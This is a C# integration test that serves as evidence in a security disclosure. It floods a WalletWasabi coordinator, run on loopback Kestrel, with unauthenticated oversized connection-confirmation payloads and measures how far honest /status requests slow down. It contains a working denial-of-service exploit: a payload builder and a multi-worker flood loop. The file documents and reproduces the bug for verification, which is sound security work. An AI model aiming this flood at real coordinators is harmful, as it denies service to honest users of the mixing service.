using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Hosting.Server;
using Microsoft.AspNetCore.Hosting.Server.Features;
using Microsoft.AspNetCore.TestHost;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using NBitcoin;
using WalletWasabi.BitcoinRpc;
using WalletWasabi.Coordinator.WabiSabi;
using WalletWasabi.FeeRateEstimation;
using WalletWasabi.Services;
using WalletWasabi.Tests.Helpers;
using WalletWasabi.WabiSabi.Coordinator;
using WalletWasabi.WabiSabi.Coordinator.DoSPrevention;
using WalletWasabi.WabiSabi.Coordinator.Rounds;
using WalletWasabi.WabiSabi.Coordinator.Statistics;
using Xunit;

namespace WalletWasabi.Tests.UnitTests.WabiSabi.Integration;

// Evidence 2 - denial of service on a REAL coordinator.
//
// This is the end-to-end proof that honest users are denied service. It runs the coordinator on
// a real Kestrel server bound to a loopback port (not the in-process TestServer) and floods it
// over real HTTP connections with unauthenticated oversized connection-confirmation bodies. It
// then measures how long an honest /status request takes while the flood is running.
//
// Why real Kestrel: the in-process TestServer does not schedule the synchronous decode work the
// way a real server does, so an in-process flood leaves honest /status at ~1 ms and hides the
// bug. On real Kestrel the oversized decodes pin every core and honest requests are pushed from
// ~2 ms to a median of hundreds of ms with a multi-second worst case. That is the denial.
//
// Measured (4-core box, vulnerable coordinator at 13e2a56):
//   baseline median ~2 ms  ->  under flood median ~1000 ms, worst case ~13 s
// The same flood against the fixed coordinator (PR #15066) leaves honest /status bounded
// (median ~120 ms, worst case ~135 ms), so these assertions FAIL on the fixed build. Run it
// against the vulnerable pin to reproduce the denial.
//
// Drop this file into WalletWasabi.Tests/UnitTests/WabiSabi/Integration/ and run:
//   ./WalletWasabi.Tests --filter-display-name "*RealKestrelStarvation*"
[Collection("Serial unit tests collection")]
public class Evidence2KestrelTests
{
	[Fact]
	public async Task RealKestrelStarvationAsync()
	{
		// A real coordinator on Kestrel, with the same mock RPC the other integration tests use.
		var host = Host.CreateDefaultBuilder()
			.ConfigureWebHostDefaults(web => web
				.UseStartup<WalletWasabi.Coordinator.Startup>()
				.UseKestrel()
				.UseUrls("http://127.0.0.1:0")
				.ConfigureLogging(o => o.SetMinimumLevel(LogLevel.Warning))
				.ConfigureTestServices(services =>
				{
					services.AddHostedService<BackgroundServiceStarter<Arena>>();
					services.AddSingleton<Arena>();
					services.AddSingleton(_ => Network.RegTest);
					services.AddSingleton<IRPCClient>(_ => BitcoinFactory.GetMockMinimalRpc());
					services.AddSingleton<Prison>(_ => WabiSabiFactory.CreatePrison());
					services.AddSingleton<WabiSabiConfig>();
					services.AddSingleton<RoundParametersFactory>(s =>
					{
						var config = s.GetRequiredService<WabiSabiConfig>();
						return (feeRate, maxSuggestedAmount, minInputCountByRound) => RoundParameters.Create(config, feeRate, maxSuggestedAmount);
					});
					services.AddSingleton(typeof(TimeSpan), _ => TimeSpan.FromSeconds(2));
					services.AddSingleton(s => new CoinJoinScriptStore());
					services.AddSingleton(s => FeeRateProviders.RpcAsync(s.GetRequiredService<IRPCClient>()));
					services.AddHttpClient();
				}))
			.Build();

		await host.StartAsync();
		var address = host.Services.GetRequiredService<IServer>().Features.Get<IServerAddressesFeature>()!.Addresses.First();
		Console.WriteLine($"[Evidence2] coordinator on real Kestrel at {address}");

		using var http = new HttpClient { BaseAddress = new Uri(address), Timeout = TimeSpan.FromSeconds(15) };

		async Task<double> StatusMsAsync()
		{
			var sw = System.Diagnostics.Stopwatch.StartNew();
			using var c = new StringContent("{\"RoundCheckpoints\":[]}", Encoding.UTF8, "application/json");
			using var r = await http.PostAsync("WabiSabi/status", c);
			sw.Stop();
			return sw.Elapsed.TotalMilliseconds;
		}

		// Warm up, then measure a quiet baseline.
		for (int i = 0; i < 3; i++) await StatusMsAsync();
		var baseS = new List<double>();
		for (int i = 0; i < 8; i++) baseS.Add(await StatusMsAsync());
		baseS.Sort();
		double baseMed = baseS[baseS.Count / 2];

		// Unauthenticated flood over real connections. Workers scale with cores so the decodes
		// saturate every core regardless of the host size.
		string body = OversizedConnectionConfirmation(150_000); // ~10 MB, ~3 s CPU/decode on the vulnerable build
		int workers = Environment.ProcessorCount * 8;
		using var floodCts = new CancellationTokenSource();
		var flood = Task.WhenAll(Enumerable.Range(0, workers).Select(async _ =>
		{
			using var fc = new HttpClient { BaseAddress = new Uri(address), Timeout = TimeSpan.FromSeconds(60) };
			while (!floodCts.IsCancellationRequested)
			{
				try { using var c = new StringContent(body, Encoding.UTF8, "application/json"); using var r = await fc.PostAsync("WabiSabi/connection-confirmation", c, floodCts.Token); }
				catch { }
			}
		}));

		await Task.Delay(TimeSpan.FromSeconds(5));
		var atkS = new List<double>();
		int deniedByTimeout = 0;
		for (int i = 0; i < 8; i++)
		{
			try { atkS.Add(await StatusMsAsync()); }
			catch { deniedByTimeout++; atkS.Add(15_000); }
		}
		floodCts.Cancel();
		try { await flood; } catch { }
		atkS.Sort();
		double atkMed = atkS[atkS.Count / 2];

		Console.WriteLine($"[Evidence2] honest /status: baseline median {baseMed:F0} ms; under flood median {atkMed:F0} ms, max {atkS[^1]:F0} ms, timed-out {deniedByTimeout}/8 (workers={workers})");

		await host.StopAsync();
		host.Dispose();

		// Denial of service: honest requests are pushed from ~1 ms to a sustained median of
		// hundreds of ms with a multi-second worst case, meaning some are effectively denied.
		Assert.True(atkMed > 100, $"expected sustained honest /status degradation, got median {atkMed:F0} ms");
		Assert.True(atkS[^1] > 2000, $"expected a multi-second worst case, got max {atkS[^1]:F0} ms");
	}

	private static string OversizedConnectionConfirmation(int nNonces)
	{
		const string pt = "0279BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798";
		var sb = new StringBuilder(nNonces * 70 + 1024);
		const string emptyZero = "{\"Requested\":[],\"Proofs\":[]}";
		sb.Append("{\"RoundId\":\"0000000000000000000000000000000000000000000000000000000000000000\",");
		sb.Append("\"AliceId\":\"00000000-0000-0000-0000-000000000000\",");
		sb.Append("\"ZeroAmountCredentialRequests\":").Append(emptyZero).Append(',');
		sb.Append("\"RealAmountCredentialRequests\":{\"Delta\":0,\"Presented\":[],\"Requested\":[],\"Proofs\":[{\"PublicNonces\":[");
		for (int i = 0; i < nNonces; i++) { if (i > 0) sb.Append(','); sb.Append('"').Append(pt).Append('"'); }
		sb.Append("],\"Responses\":[\"0000000000000000000000000000000000000000000000000000000000000001\"]}]},");
		sb.Append("\"ZeroVsizeCredentialRequests\":").Append(emptyZero).Append(',');
		sb.Append("\"RealVsizeCredentialRequests\":{\"Delta\":0,\"Presented\":[],\"Requested\":[],\"Proofs\":[]}}");
		return sb.ToString();
	}
}
